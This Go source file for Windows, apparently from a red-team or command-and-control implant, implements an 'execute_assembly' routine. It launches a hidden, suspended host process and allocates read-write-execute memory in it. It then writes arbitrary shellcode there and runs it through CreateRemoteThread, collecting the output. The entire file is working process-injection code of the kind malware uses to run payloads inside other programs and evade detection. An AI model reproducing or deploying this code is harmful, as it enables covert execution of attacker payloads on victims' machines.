//go:build windows
// +build windows

package execute_assembly

import (
	"bytes"
	"errors"
	"fmt"
	"os/exec"
	//"strings"
	"syscall"
	"time"
	"unsafe"
)

const (
	PROCESS_ALL_ACCESS = syscall.STANDARD_RIGHTS_REQUIRED | syscall.SYNCHRONIZE | 0xfff
	MEM_COMMIT         = 0x001000
	MEM_RESERVE        = 0x002000
	STILL_RUNNING      = 259
	CREATE_SUSPENDED   = 0x00000004
)

var (
	kernel32           = syscall.MustLoadDLL("kernel32.dll")
	virtualAllocEx     = kernel32.MustFindProc("VirtualAllocEx")
	writeProcessMemory = kernel32.MustFindProc("WriteProcessMemory")
	createRemoteThread = kernel32.MustFindProc("CreateRemoteThread")
	getExitCodeThread  = kernel32.MustFindProc("GetExitCodeThread")
)

func executeShellcode(sc []byte, spawnas string) (string, error) {

	// create process
	var stdoutBuf bytes.Buffer
	var stderrBuf bytes.Buffer
	proc := exec.Command(spawnas)

	proc.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: CREATE_SUSPENDED,
	}
	proc.Stdout = &stdoutBuf
	proc.Stderr = &stderrBuf
	err := proc.Start()
	if err != nil {
		return "", errors.New(spawnas + " process failed to start")
	}

	pid := proc.Process.Pid

	// Open Process
	handle, err := syscall.OpenProcess(PROCESS_ALL_ACCESS, true, uint32(pid))
	if err != nil {
		return "", errors.New("OpenProcess failed")
	}

	// VirtualAllocEx
	addr, _, _ := virtualAllocEx.Call(
		uintptr(handle),
		0,
		uintptr(len(sc)),
		MEM_COMMIT|MEM_RESERVE,
		syscall.PAGE_EXECUTE_READWRITE,
	)

	if int(addr) == 0 {
		return "", errors.New("VirtualAllocEx failed")
	}

	// WriteProcessMemory
	var nLength uint32
	r1, _, _ := writeProcessMemory.Call(
		uintptr(handle),
		addr,
		uintptr(unsafe.Pointer(&sc[0])),
		uintptr(len(sc)),
		uintptr(unsafe.Pointer(&nLength)),
	)
	if int(r1) == 0 {
		return "", errors.New("WriteProcessMemory failed")
	}

	// CreateRemoteThread
	threadHandle, _, err := createRemoteThread.Call(
		uintptr(handle),
		0,
		0,
		addr,
		0,
		0,
		0,
	)

	if err != nil && err.Error() != "The operation completed successfully." {
		return "", err
	}

	// Running
	// fmt.Println("Got thread handle:", threadHandle)
	var exitCode uint32
	for {
		r1, _, err := getExitCodeThread.Call(
			uintptr(threadHandle),
			uintptr(unsafe.Pointer(&exitCode)),
		)
		if r1 == 0 {
			return "", err
		}

		if err != nil && err.Error() != "The operation completed successfully." {
			return "", err
		}
		if exitCode == STILL_RUNNING {
			time.Sleep(1000 * time.Millisecond)
		} else {
			break
		}
	}

	// Cleanup
	outStr, errStr := stdoutBuf.String(), stderrBuf.String()
	proc.Process.Kill()
	out := fmt.Sprintf("\nout:\n%s\nerr:\n%s\n", outStr, errStr)
	return out, nil
}
